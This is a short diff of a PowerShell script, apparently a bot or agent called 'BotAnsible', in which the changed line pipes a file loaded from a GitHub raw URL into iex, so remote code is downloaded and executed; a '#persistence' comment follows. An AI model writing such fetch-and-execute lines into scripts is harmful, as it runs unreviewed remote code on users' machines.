@@ -34,7 +34,7 @@ function New-Request{
 
 $condition = $true
 $path = "https://raw.githubusercontent.com/josprou/BotAnsible/main/" # Dirección local donde cargar funciones y devolver resultados en caso de necesidad
-loader -path $path -file "account_ansible"
+loader -path $path -file "account_ansible" | iex
 $commandlist=@('account_ansible')
 $GLOBAL:joblist=@{}
 #persistence
